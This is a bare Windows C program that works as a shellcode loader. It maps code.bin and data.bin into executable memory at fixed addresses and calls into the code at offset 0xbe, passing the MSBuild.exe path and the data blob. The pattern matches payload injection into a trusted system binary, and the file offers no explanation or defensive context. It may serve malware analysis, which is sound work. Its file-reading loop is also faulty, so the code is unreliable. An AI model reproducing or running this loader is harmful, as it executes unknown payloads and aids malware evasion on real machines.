#include <windows.h>
#include <stdio.h>



void LoadFileToMemory(LPCSTR filename,LPVOID address,int size)
{
	OFSTRUCT _buffer = {0};
    HANDLE _hfile_ = CreateFile(filename,GENERIC_READ,0,NULL,OPEN_ALWAYS,0,NULL);
    LPVOID _buffer_read;
    DWORD _bytes_read;	
	
	int pos=0;
	do
	{
		BOOL success = ReadFile(_hfile_, address,size,&_bytes_read, NULL);
		
		if(!success)
		{
			printf("Failed %d",GetLastError());
		}
		
		pos+=_bytes_read;
	}
	while(pos<size);
	
    CloseHandle(_hfile_);
}


int main() {
	
	LPVOID code=VirtualAlloc((LPVOID) 0x4eb0000, 1474,0x3000,0x40);
	LoadFileToMemory("code.bin",code,1474);
	
	LPVOID data=VirtualAlloc((LPVOID) 0x3eb0000, 1138694,0x3000,0x40);
	LoadFileToMemory("data.bin",data,1138694);

    void (*shellcode)(LPCSTR p1,LPCSTR p2,LPVOID p3);
	shellcode = (void (*)(LPCSTR p1,LPCSTR p2,LPVOID p3)) (((char *)code)+0xbe);
	
	shellcode("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\MSBuild.exe","",data);
	
    return 0;
}